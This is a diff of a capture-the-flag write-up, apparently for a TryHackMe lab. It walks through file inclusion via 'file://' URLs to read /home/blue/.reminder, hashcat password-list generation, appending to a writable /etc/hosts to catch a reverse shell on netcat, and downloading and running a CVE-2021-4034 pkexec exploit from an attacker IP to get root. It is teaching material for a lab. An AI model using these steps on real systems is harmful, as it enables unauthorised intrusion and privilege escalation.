@@ -56,7 +56,7 @@ if (isset($page) && preg_match("/^[a-z]/", $page)) {
 
 ?>
 ```
-###### 1. As we read the function 'sanitize_input' it removes '../' and then removes './'<br>2. We see the 'sanitize_input' being used after 'preg_match' php built-in function that searches for expressions in strings<br>3. So it is going to avoid us from inputting symbols, numbers before letters.
+###### 1. As we read the function 'sanitize_input' it removes '../' and then removes './'<br>2. We see the 'sanitize_input' being used after 'preg_match' a php built-in function that searches for expressions in strings<br>3. So its not going to allow us from inputting symbols, numbers before letters and paths such as '/var/www/html/index.php'.
 ###### However we could still do this
 ```
 curl http://target-ip/index.php?page=file:///var/www/html/index.php
@@ -93,7 +93,7 @@ cat passlist.txt
 rm passlist.txt
 sudo apt-get remove hashcat -y
 ```
-###### Wow, we see hashcat creating a password list from one password that is stored in .reminder file
+###### Wow, we see hashcat creating a password list from one password that is stored in '.reminder' file
 ```
 curl http://target-ip/index.php?page=file:///home/blue/.reminder
 ```
@@ -146,7 +146,7 @@ red        16234  0.0  0.1   6972  2644 ?        S    10:57   0:00 bash -c nohup
 ```
 ping redrules.thm
 ```
-###### Wow, its taking ages but look at the ipv4, its weird. Lets check the '/etc/hosts' file
+###### Wow, its taking ages but look at the ipv4, its weird and local looking. Lets check the '/etc/hosts' file
 ```
 cat /etc/hosts
 ```
@@ -187,7 +187,7 @@ grep -v "rem_address" /proc/net/tcp  | awk  '{x=strtonum("0x"substr($3,index($3,
 192.168.0.1:9001
 192.168.0.1:9001
 ```
-###### Ok that makes sense, since we know there are two bash commands running by user red. Does that mean the hosts fil...
+###### Ok that makes sense, since we know there are two bash commands running by user red. Could that mean the hosts fil...
 ```
 ls -la /etc/hosts
 ```
@@ -195,7 +195,7 @@ ls -la /etc/hosts
 ```
 -rw-r--rw- 1 root adm 242 Jul 19 11:15 /etc/hosts
 ```
-###### 👀😲, Itsss writable, but can only append. This file resets too upon some command so watch out if it disappears.
+###### 👀😲, Itsss writable, but we can only append. This file resets too upon some command so watch out if it disappears.
 Step 6:
 ###### Use netcat(nc/netcat) to listen for and connections on port 9001
 ```
@@ -225,7 +225,7 @@ drwxr-x--- 2 red  red  4096 Aug 14  2022 .git
 -rw-rw-r-- 1 red  red    75 Aug 14  2022 .selected_editor
 -rw------- 1 red  red     0 Aug 17  2022 .viminfo
 ```
-###### A '.git' folder 👀
+###### A '.git' folder 🤨, Doesn't seem empty.
 ```
 ls -la ~/.git
 ```
@@ -235,7 +235,7 @@ drwxr-x--- 2 red  red   4096 Aug 14  2022 .
 drwxr-xr-x 4 root red   4096 Aug 17  2022 ..
 -rwsr-xr-x 1 root root 31032 Aug 14  2022 pkexec
 ```
-###### Wowwwwww, pkexec! Lets check its version to see if we can exploit it
+###### Wowwwwww😲, pkexec! Lets check its version to see if we can exploit it
 ```
 ./pkexec --version
 ```
@@ -243,13 +243,13 @@ drwxr-xr-x 4 root red   4096 Aug 17  2022 ..
 ```
 pkexec version 0.105
 ```
-###### If we search on google for a exploit you will come across 'CVE-2021-4034'. Since there is no compiler we can't compile it on the target. What we do find if we research for futher is that we find a python script of the exploit. Remember we can't write files in home directory so we need to download it into /tmp directory. So on in our terminal locate the file directory and start a http server so that we could download the file from the target.
-###### Before we start. First open the CVE exploit file and edit the path to the pkexec
+###### If we search on google for a exploit you will come across 'CVE-2021-4034'. Since there is no compiler on the target, we can't compile it on the target. What we do find if we research futher is that we find a python script of the exploit. Remember we cannot write files in home directory so we need to download it into /tmp directory. So on in our terminal locate the file directory and start a http server so that we could download the file from the target.
+###### Before we start. First open the CVE exploit file and edit the path to the pkexec elf program on the targets machine.
 ```python3
 .....
 libc.execve(b'/home/red/.git/pkexec', c_char_p(None), environ_p)
 ```
-###### Then proceed with server
+###### Then proceed with hosting a http server
 ```
 python3 -m http.server 8080
 ```
@@ -257,7 +257,7 @@ python3 -m http.server 8080
 ```
 wget http://your-ip:8080/CVE-2021-4034.py
 ```
-###### Run the exploit
+###### Now run the exploit using python3
 ```
 python3 CVE-2021-4034.py
 ```
@@ -268,6 +268,10 @@ whoami
 ###### Output:
 ```
 root
+```
+###### Your shell is bad thats why you didnt even know you were root. To fix this do:
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 # Congratulations you just Won the battle against Red!
 ![image](https://github.com/solocyberengineer/MrBud-Home/assets/90530825/6b3eee9e-f140-4b71-a36c-f2ddc560e3c0)
